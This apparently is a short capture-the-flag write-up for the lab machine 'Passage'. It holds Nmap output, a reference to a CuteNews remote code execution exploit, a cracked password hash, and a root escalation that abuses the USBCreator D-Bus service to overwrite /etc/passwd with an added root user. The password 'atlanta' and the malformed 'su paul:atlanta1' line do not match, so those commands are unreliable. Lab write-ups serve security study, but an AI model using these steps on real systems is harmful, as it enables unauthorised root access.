# Passage

### Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploitation

```bash
# get shell from the exploit
CuteNews 2.1.2 - Remote Code Execution  | php/webapps/48800.py

# switch to paul
paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta
```

### Priv Esc

```bash
# switch to paul
su paul:atlanta1

# switch to nadav with paul ssh key
ssh -i ~/.ssh/id_rsa nadav@127.0.0.1

# dbus 
cat /etc/passwd > passwd.evil
echo "evil:$(openssl passwd -1 evil):0:0:root:/root:/bin/bash" >> passwd.evil
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image ~/passwd.evil /etc/passwd true
```
